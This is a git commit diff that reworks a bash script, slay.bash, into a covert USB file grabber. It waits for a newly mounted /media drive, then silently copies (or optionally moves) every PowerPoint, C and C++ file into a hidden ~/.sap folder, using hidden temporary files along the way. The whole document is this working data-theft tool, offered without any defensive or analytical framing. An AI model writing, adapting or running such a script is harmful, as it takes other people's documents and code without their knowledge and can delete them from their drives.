70e0caaf51d8c51d3cddaa5006f2f2a606025421
prabhakaran9397 <prabhakaran9397@gmail.com>
2016-08-26 01:22:38 +0530

    almost done installation pending

--- slay.bash
+++ slay.bash
@@ -1,28 +1,29 @@
 #/bin/bash
 
-#cp for copy 
-#mv for move
-
+#cp for copy; mv for move;
 SLAY_LEVEL=cp
 
+#files you want to slay
 EXTENTIONS=("ppt" "pptx" "c" "cpp")
 
-SOURCE_DIR=..
-
-TARGET_PATH=$(pwd)
-cd $SOURCE_DIR
-SOURCE_PATH=$(pwd)
-cd $TARGET_PATH
+mount | grep /media/ | awk '{print$3}' > .before
+while [ "$USB" = "" ]; do
+        sleep 5
+        mount | grep /media/ | awk '{print$3}' > .present
+        USB=$(comm -13 .before .present)
+done
+rm .before .present
+	
+SOURCE_PATH=$USB
+TARGET_PATH=~/.sap
 
 for EXTENTION in ${EXTENTIONS[@]}; do
-	find $SOURCE_PATH -name "*.$EXTENTION" > FILES.txt
+	find $SOURCE_PATH -name "*.$EXTENTION" > .FILES.txt
 
-	NUMBER_OF_FILES=$(grep -c "" FILES.txt)
-
+	NUMBER_OF_FILES=$(grep -c "" .FILES.txt)
 	for i in `seq 1 $NUMBER_OF_FILES`; do
-        	FILE=$(sed -n "$i p" FILES.txt)
+        	FILE=$(sed -n "$i p" .FILES.txt)
         	$SLAY_LEVEL "$FILE" "$TARGET_PATH/$i.$EXTENTION"
 	done
 done
-
-rm FILES.txt
+rm .FILES.txt
